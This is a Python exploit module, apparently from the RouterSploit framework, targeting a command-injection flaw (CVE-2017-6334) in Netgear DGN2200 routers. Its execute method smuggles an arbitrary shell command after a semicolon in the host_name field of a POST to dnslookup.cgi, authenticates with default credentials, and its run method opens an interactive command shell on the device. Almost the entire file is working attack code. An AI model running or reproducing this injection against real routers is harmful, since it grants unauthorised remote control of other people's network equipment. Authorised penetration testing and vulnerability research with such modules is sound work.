from routersploit import (
    exploits,
    print_status,
    mute,
    validators,
    http_request,
    shell,
)


class Exploit(exploits.Exploit):
    """
    Exploits Netgear DGN2200 RCE vulnerability through dnslookup.cgi resource.
    """
    __info__ = {
        'name': 'Netgear DGN2200 RCE',
        'description': 'Exploits Netgear DGN2200 RCE vulnerability through dnslookup.cgi resource',
        'authors': [
            'SivertPL',  # vulnerability discovery
            'Marcin Bury <marcin.bury[at]reverse-shell.com>',  # routersploit module
        ],
        'references': [
            'https://www.exploit-db.com/exploits/41459/',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-6334',
        ],
        'devices': [
            'Netgear DGN2200v1',
            'Netgear DGN2200v2',
            'Netgear DGN2200v3',
            'Netgear DGN2200v4',
        ],
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1', validators=validators.url)  # target address
    port = exploits.Option(80, 'Target Port')  # target port

    username = exploits.Option('admin', 'Username')
    password = exploits.Option('password', 'Password')

    def run(self):
        print_status("It is not possible to check if target is vulnerable")
        print_status("Trying to invoke command loop...")
        print_status("It is blind command injection. Response is not available.")
        shell(self, architecture="mipsbe")

    def execute(self, cmd):
        url = "{}:{}/dnslookup.cgi".format(self.target, self.port)

        payload = "www.google.com; {}".format(cmd)
        data = {
            "host_name": payload,
            "lookup": "Lookup"
        }

        http_request(method="POST", url=url, data=data, auth=(self.username, self.password))
        return ""

    @mute
    def check(self):
        return None  # not possible to check if target is vulnerable
